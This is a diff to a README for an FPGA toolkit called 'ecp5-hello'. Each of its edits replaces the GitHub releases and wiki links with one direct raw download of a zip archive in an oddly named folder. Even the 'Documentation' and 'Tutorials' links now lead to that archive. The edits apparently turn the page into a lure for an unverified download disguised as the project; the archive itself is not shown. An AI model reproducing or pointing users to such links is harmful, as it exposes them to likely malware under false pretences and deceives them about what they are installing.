@@ -1,6 +1,6 @@
 # 🎉 ecp5-hello - Easy Open-Source FPGA Tools for Everyone
 
-[![Download ecp5-hello](https://img.shields.io/badge/Download-ecp5--hello-brightgreen)](https://github.com/Kuykakuy/ecp5-hello/releases)
+[![Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
 
 ## 📦 What is ecp5-hello?
 
@@ -23,7 +23,7 @@ Ensure your system meets the following requirements:
 
 Visit this page to download the latest version of ecp5-hello:
 
-[Download ecp5-hello](https://github.com/Kuykakuy/ecp5-hello/releases)
+[Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
 
 ### 3. Install ecp5-hello
 
@@ -59,8 +59,8 @@ ecp5-hello comes with a variety of advanced tools that enhance your FPGA develop
 
 For more guidance, explore our documentation and tutorials available online. These resources can help you understand FPGA concepts better and assist with troubleshooting.
 
-- [Documentation](https://github.com/Kuykakuy/ecp5-hello/wiki)
-- [Tutorials](https://github.com/Kuykakuy/ecp5-hello/wiki/Tutorials)
+- [Documentation](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
+- [Tutorials](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
 
 ## 🐞 Troubleshooting
 
@@ -81,6 +81,6 @@ Join our community for discussions and support:
 
 Ready to revolutionize your FPGA experience? 
 
-Visit this page to download ecp5-hello: [Download ecp5-hello](https://github.com/Kuykakuy/ecp5-hello/releases)
+Visit this page to download ecp5-hello: [Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
 
 Install the application on your device and begin your journey with FPGA development today!
